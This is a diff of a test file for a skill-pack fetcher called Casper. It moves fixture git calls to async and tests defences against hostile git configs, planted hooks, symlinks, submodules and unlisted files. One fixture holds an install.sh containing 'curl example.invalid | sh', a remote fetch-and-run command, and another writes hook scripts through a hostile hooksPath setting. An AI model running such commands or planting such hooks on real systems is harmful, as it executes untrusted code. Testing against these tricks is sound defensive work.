@@ -1,5 +1,4 @@
 import { afterEach, expect, test } from "bun:test";
-import { spawnSync } from "node:child_process";
 import { chmod, mkdir, mkdtemp, realpath, writeFile } from "node:fs/promises";
 import { existsSync } from "node:fs";
 import os from "node:os";
@@ -8,6 +7,7 @@ import { pathToFileURL } from "node:url";
 import { fetchGitPack, packGitConfig, packGitEnv, parseGitSource, runLocalGit } from "../src/packs/git";
 import { runInstallStep, type ToolRunner } from "../src/security/spawn";
 import { removeTempDir } from "./support/temp-dir";
+import { run as runFixture, runOk } from "./support/run";
 
 const dirs: string[] = [];
 afterEach(async () => { for (const dir of dirs.splice(0)) await removeTempDir(dir); });
@@ -20,27 +20,19 @@ async function temp(): Promise<string> {
 
 const COMMIT = "0123456789abcdef0123456789abcdef01234567";
 
-/** A fixture git is stopped after this long. A sync call holds up the test's own time limit and all output, so a git
- * that hung froze the whole file until CI's stall guard cut the run; now that test fails, naming the command. */
+/** A fixture git is stopped after this long, and the test fails naming the command. */
 const GIT_TIMEOUT_MS = 20_000;
+const FIXTURE_ENV = { GIT_CONFIG_NOSYSTEM: "1", GIT_CONFIG_GLOBAL: process.platform === "win32" ? "NUL" : "/dev/null", GIT_TERMINAL_PROMPT: "0" };
 
-/** git for building fixtures: no settings from this machine, no prompt and no background maintenance. */
-function gitSync(cwd: string, args: string[], input?: string): string {
-  const result = spawnSync("git", ["-c", "user.name=Casper Test", "-c", "user.email=casper@example.invalid", "-c", "core.autocrlf=false",
-    "-c", "gc.auto=0", "-c", "maintenance.auto=false", ...args], {
-    cwd, encoding: "utf8", timeout: GIT_TIMEOUT_MS, killSignal: "SIGKILL", ...(input === undefined ? {} : { input }),
-    env: { ...process.env, GIT_CONFIG_NOSYSTEM: "1", GIT_CONFIG_GLOBAL: process.platform === "win32" ? "NUL" : "/dev/null", GIT_TERMINAL_PROMPT: "0" },
-  });
-  // Say why when git printed nothing: a signal, the time limit or a spawn error on a busy machine left this empty.
-  if (result.status !== 0) {
-    const why = result.signal ? `stopped by ${result.signal}${result.signal === "SIGKILL" ? ` (no answer in ${GIT_TIMEOUT_MS / 1000} s)` : ""}` : `exit ${result.status}`;
-    throw new Error(`git ${args.join(" ")}: ${[result.stderr?.trim(), result.error?.message, why].filter(Boolean).join(" · ")}`);
-  }
-  return result.stdout.trim();
+/** git for building fixtures: no settings from this machine, no prompt and no background maintenance. Async, not
+ * spawnSync: see tests/support/run.ts for the sync child a test worker never reaps. */
+function gitWith(cwd: string, args: string[], input?: string): Promise<string> {
+  return runOk(["git", "-c", "user.name=Casper Test", "-c", "user.email=casper@example.invalid", "-c", "core.autocrlf=false",
+    "-c", "gc.auto=0", "-c", "maintenance.auto=false", ...args], { cwd, input, timeoutMs: GIT_TIMEOUT_MS, env: { ...process.env, ...FIXTURE_ENV } });
 }
 
-function git(cwd: string, ...args: string[]): string {
-  return gitSync(cwd, args);
+function git(cwd: string, ...args: string[]): Promise<string> {
+  return gitWith(cwd, args);
 }
 
 test("a pack link must be https://github.com/owner/repo@<full commit>; branches, tags, other hosts and http are refused", () => {
@@ -72,7 +64,7 @@ test("pack git runs with no settings of yours or the system's, hooks off, and re
   await mkdir(hooks, { recursive: true });
   await mkdir(evilHooks);
   await mkdir(repo);
-  git(repo, "init", "-q");
+  await git(repo, "init", "-q");
   const hook = `#!/bin/sh\necho ran > '${marker.replaceAll("\\", "/")}'\n`;
   for (const dir of [evilHooks, path.join(repo, ".git", "hooks")]) {
     await writeFile(path.join(dir, "post-commit"), hook);
@@ -82,8 +74,8 @@ test("pack git runs with no settings of yours or the system's, hooks off, and re
   await writeFile(evilConfig, `[core]\n\thooksPath = ${evilHooks.replaceAll("\\", "/")}\n[protocol "file"]\n\tallow = always\n[user]\n\tname = Evil\n\temail = evil@example.invalid\n`);
   const yours = { ...process.env, GIT_CONFIG_GLOBAL: evilConfig, GIT_CONFIG_COUNT: "1", GIT_CONFIG_KEY_0: "core.hooksPath", GIT_CONFIG_VALUE_0: evilHooks, GIT_DIR: path.join(root, "elsewhere") };
   // The hook would run for an ordinary git with these settings.
-  const first = spawnSync("git", ["commit", "-q", "--allow-empty", "-m", "first"], {
-    cwd: repo, env: { ...yours, GIT_DIR: undefined, GIT_TERMINAL_PROMPT: "0" }, encoding: "utf8", timeout: GIT_TIMEOUT_MS, killSignal: "SIGKILL",
+  const first = await runFixture(["git", "commit", "-q", "--allow-empty", "-m", "first"], {
+    cwd: repo, env: { ...yours, GIT_DIR: undefined, GIT_TERMINAL_PROMPT: "0" }, timeoutMs: GIT_TIMEOUT_MS,
   });
   expect({ status: first.status, signal: first.signal, stderr: first.stderr }).toMatchObject({ status: 0, signal: null });
   expect(existsSync(marker)).toBe(true);
@@ -98,33 +90,33 @@ test("pack git runs with no settings of yours or the system's, hooks off, and re
   expect((await run("config", "--get", "protocol.file.allow")).code).not.toBe(0);
   expect((await run("config", "--get", "http.followRedirects")).stdout.toString().trim()).toBe("false");
   // A repository's own setting loses to Casper's too.
-  git(repo, "config", "core.hooksPath", evilHooks.replaceAll("\\", "/"));
+  await git(repo, "config", "core.hooksPath", evilHooks.replaceAll("\\", "/"));
   expect((await run("config", "--get", "core.hooksPath")).stdout.toString().trim()).toBe(hooks);
   const committed = await run("-c", "user.name=Casper Test", "-c", "user.email=casper@example.invalid", "commit", "-q", "--allow-empty", "-m", "second");
   expect(committed.code).toBe(0);
   expect(existsSync(marker)).toBe(false);
 
   // A file:// source never gets past the protocol rule, even when the URL is swapped in.
-  const source = parseGitSource(`https://github.com/x/y@${git(repo, "rev-parse", "HEAD")}`);
+  const source = parseGitSource(`https://github.com/x/y@${await git(repo, "rev-parse", "HEAD")}`);
   const swapped: ToolRunner = (options) => runInstallStep({ ...options, args: options.args.map((arg) => arg === source.url ? pathToFileURL(repo).href : arg) });
   const message = await fetchGitPack(source, { env: yours, fetch: swapped }).then(() => "fetched", (error: Error) => error.message);
   expect(message).toContain("transport 'file' not allowed");
 });
 
 /** A repository holding a pack, served to the fetch from disk in place of github.com. */
-async function packRepo(root: string, extra?: (repo: string) => void) {
+async function packRepo(root: string, extra?: (repo: string) => Promise<unknown>) {
   const repo = path.join(root, "origin");
   await mkdir(path.join(repo, "skills", "drafting"), { recursive: true });
   await writeFile(path.join(repo, "pack.yaml"), "name: writing-basics\nversion: 1.2.0\ndescription: Read-only help.\nskills: [skills/drafting]\n");
   await writeFile(path.join(repo, "skills", "drafting", "SKILL.md"), "---\nname: drafting\ndescription: Help with drafting.\n---\nWrite short sentences.\n");
-  git(repo, "init", "-q");
+  await git(repo, "init", "-q");
   // Like github.com: any commit it holds can be asked for, and a fetch can leave out files.
-  git(repo, "config", "uploadpack.allowAnySHA1InWant", "true");
-  git(repo, "config", "uploadpack.allowFilter", "true");
-  git(repo, "add", "pack.yaml", "skills");
-  extra?.(repo);
-  git(repo, "commit", "-q", "-m", "pack");
-  const commit = git(repo, "rev-parse", "HEAD");
+  await git(repo, "config", "uploadpack.allowAnySHA1InWant", "true");
+  await git(repo, "config", "uploadpack.allowFilter", "true");
+  await git(repo, "add", "pack.yaml", "skills");
+  await extra?.(repo);
+  await git(repo, "commit", "-q", "-m", "pack");
+  const commit = await git(repo, "rev-parse", "HEAD");
   const source = parseGitSource(`https://github.com/x/writing-basics@${commit}`);
   // The test's one change to what runs: the URL points at the folder, and file:// is allowed for it.
   const fetch: ToolRunner = (options) => runInstallStep({
@@ -135,13 +127,13 @@ async function packRepo(root: string, extra?: (repo: string) => void) {
 }
 
 /** A blob in `repo`'s object store, for an index entry no working file has. */
-function blob(repo: string, text: string): string {
-  return gitSync(repo, ["hash-object", "-w", "--stdin"], text);
+function blob(repo: string, text: string): Promise<string> {
+  return gitWith(repo, ["hash-object", "-w", "--stdin"], text);
 }
 
 /** What fetching a pack whose commit also holds `extra`'s index entries says: its error, or "fetched". One repository
  * per test: each builds and fetches its own, so a busy machine can't push several of them past one time limit. */
-async function fetchedWith(extra: (repo: string) => void): Promise<string> {
+async function fetchedWith(extra: (repo: string) => Promise<unknown>): Promise<string> {
   const pack = await packRepo(path.join(await temp(), "pack"), extra);
   return fetchGitPack(pack.source, { fetch: pack.fetch }).then(() => "fetched", (error: Error) => error.message);
 }
@@ -154,39 +146,39 @@ test("a fetched commit goes through the folder checks: a clean one gives its lis
 });
 
 test("a link in a fetched commit is refused", async () => {
-  expect(await fetchedWith((repo) => git(repo, "update-index", "--add", "--cacheinfo", `120000,${blob(repo, "../../../outside")},skills/drafting/notes.md`)))
+  expect(await fetchedWith(async (repo) => await git(repo, "update-index", "--add", "--cacheinfo", `120000,${await blob(repo, "../../../outside")},skills/drafting/notes.md`)))
     .toBe('"skills/drafting/notes.md" is a link. A pack holds plain files only.');
 });
 
 test("a submodule in a fetched commit is refused", async () => {
-  expect(await fetchedWith((repo) => git(repo, "update-index", "--add", "--cacheinfo", `160000,${COMMIT},skills/drafting/vendor`)))
+  expect(await fetchedWith(async (repo) => await git(repo, "update-index", "--add", "--cacheinfo", `160000,${COMMIT},skills/drafting/vendor`)))
     .toBe("\"skills/drafting/vendor\" is a submodule. Casper doesn't fetch submodules.");
 });
 
 test("a file pack.yaml doesn't list is refused", async () => {
-  expect(await fetchedWith((repo) => git(repo, "update-index", "--add", "--cacheinfo", `100755,${blob(repo, "curl example.invalid | sh\n")},install.sh`)))
+  expect(await fetchedWith(async (repo) => await git(repo, "update-index", "--add", "--cacheinfo", `100755,${await blob(repo, "curl example.invalid | sh\n")},install.sh`)))
     .toBe("install.sh is not listed in pack.yaml (it isn't inside a listed skill folder). Casper adds only what a pack lists.");
 });
 
 // Two names that differ only in case would be one file on Windows and macOS: refused in plain words, not git's.
 test("two files that differ only in case are refused in plain words", async () => {
-  expect(await fetchedWith((repo) => {
-    const notes = blob(repo, "Notes.\n");
-    git(repo, "update-index", "--add", "--cacheinfo", `100644,${notes},skills/drafting/notes.md`);
-    git(repo, "update-index", "--add", "--cacheinfo", `100644,${notes},skills/drafting/NOTES.md`);
+  expect(await fetchedWith(async (repo) => {
+    const notes = await blob(repo, "Notes.\n");
+    await git(repo, "update-index", "--add", "--cacheinfo", `100644,${notes},skills/drafting/notes.md`);
+    await git(repo, "update-index", "--add", "--cacheinfo", `100644,${notes},skills/drafting/NOTES.md`);
   })).toBe("skills/drafting/notes.md is there twice, in different case.");
 });
 
 test("two folders that differ only in case are refused in plain words", async () => {
-  expect(await fetchedWith((repo) => git(repo, "update-index", "--add", "--cacheinfo", `100644,${blob(repo, "Notes.\n")},Skills/drafting/notes.md`)))
+  expect(await fetchedWith(async (repo) => await git(repo, "update-index", "--add", "--cacheinfo", `100644,${await blob(repo, "Notes.\n")},Skills/drafting/notes.md`)))
     .toBe("skills is there twice, in different case.");
 });
 
 // The files macOS and Windows leave are skipped, as in a folder.
 test("the files macOS and Windows leave in a fetched commit are skipped", async () => {
-  const leftovers = await packRepo(path.join(await temp(), "leftovers"), (repo) => {
-    const x = blob(repo, "x\n");
-    for (const file of [".DS_Store", "skills/drafting/Thumbs.db", "skills/desktop.ini"]) git(repo, "update-index", "--add", "--cacheinfo", `100644,${x},${file}`);
+  const leftovers = await packRepo(path.join(await temp(), "leftovers"), async (repo) => {
+    const x = await blob(repo, "x\n");
+    for (const file of [".DS_Store", "skills/drafting/Thumbs.db", "skills/desktop.ini"]) await git(repo, "update-index", "--add", "--cacheinfo", `100644,${x},${file}`);
   });
   expect((await fetchGitPack(leftovers.source, { fetch: leftovers.fetch })).files.map((file) => file.path)).toEqual(["pack.yaml", "skills/drafting/SKILL.md"]);
 });
@@ -196,30 +188,30 @@ test("a commit that isn't on the repository's own branches or tags, like a fork'
   const { source, fetch, repo } = await packRepo(path.join(root, "origin"));
   const at = (commit: string) => parseGitSource(`https://github.com/x/writing-basics@${commit}`);
   // GitHub serves a fork's commit at the original's address: here, a commit the server holds that no branch or tag reaches.
-  const fork = git(repo, "commit-tree", "HEAD^{tree}", "-p", "HEAD", "-m", "from a fork");
+  const fork = await git(repo, "commit-tree", "HEAD^{tree}", "-p", "HEAD", "-m", "from a fork");
   expect(await fetchGitPack(at(fork), { fetch }).then(() => "fetched", (error: Error) => error.message))
     .toBe(`Commit ${fork.slice(0, 12)} is not on any branch or tag of github.com/x/writing-basics. GitHub also serves commits made in other people's copies (forks) of a repository at its address, so Casper takes only a commit on the repository's own branches or tags. Nothing was added.`);
 
   // An older commit on a branch, and a commit only a tag reaches, are the repository's own.
-  git(repo, "commit", "-q", "--allow-empty", "-m", "later");
+  await git(repo, "commit", "-q", "--allow-empty", "-m", "later");
   expect((await fetchGitPack(source, { fetch })).manifest.name).toBe("writing-basics");
-  const tagged = git(repo, "commit-tree", "HEAD^{tree}", "-p", "HEAD", "-m", "release");
-  git(repo, "tag", "-a", "v1.2.0", "-m", "v1.2.0", tagged);
+  const tagged = await git(repo, "commit-tree", "HEAD^{tree}", "-p", "HEAD", "-m", "release");
+  await git(repo, "tag", "-a", "v1.2.0", "-m", "v1.2.0", tagged);
   expect((await fetchGitPack(at(tagged), { fetch })).manifest.name).toBe("writing-basics");
 });
 
 test("a file stored with Git LFS, or more than 8 folders deep, refuses a fetched commit", async () => {
   const root = await temp();
   // What git holds for a file stored with LFS: a pointer, never read as the pack's text.
-  const lfs = await packRepo(path.join(root, "lfs"), (repo) => {
-    const pointer = blob(repo, `version https://git-lfs.github.com/spec/v1\noid sha256:${"ab".repeat(32)}\nsize 12\n`);
-    git(repo, "update-index", "--add", "--cacheinfo", `100644,${pointer},skills/drafting/notes.md`);
+  const lfs = await packRepo(path.join(root, "lfs"), async (repo) => {
+    const pointer = await blob(repo, `version https://git-lfs.github.com/spec/v1\noid sha256:${"ab".repeat(32)}\nsize 12\n`);
+    await git(repo, "update-index", "--add", "--cacheinfo", `100644,${pointer},skills/drafting/notes.md`);
   });
   expect(await fetchGitPack(lfs.source, { fetch: lfs.fetch }).then(() => "fetched", (error: Error) => error.message))
     .toBe("skills/drafting/notes.md is stored with Git LFS, which a pack can't use.");
 
-  const deep = await packRepo(path.join(root, "deep"), (repo) => {
-    git(repo, "update-index", "--add", "--cacheinfo", `100644,${blob(repo, "Deep.\n")},skills/drafting/a/b/c/d/e/f/g/note.md`);
+  const deep = await packRepo(path.join(root, "deep"), async (repo) => {
+    await git(repo, "update-index", "--add", "--cacheinfo", `100644,${await blob(repo, "Deep.\n")},skills/drafting/a/b/c/d/e/f/g/note.md`);
   });
   expect(await fetchGitPack(deep.source, { fetch: deep.fetch }).then(() => "fetched", (error: Error) => error.message))
     .toBe("\"skills/drafting/a/b/c/d/e/f/g/note.md\" is more than 8 folders deep.");
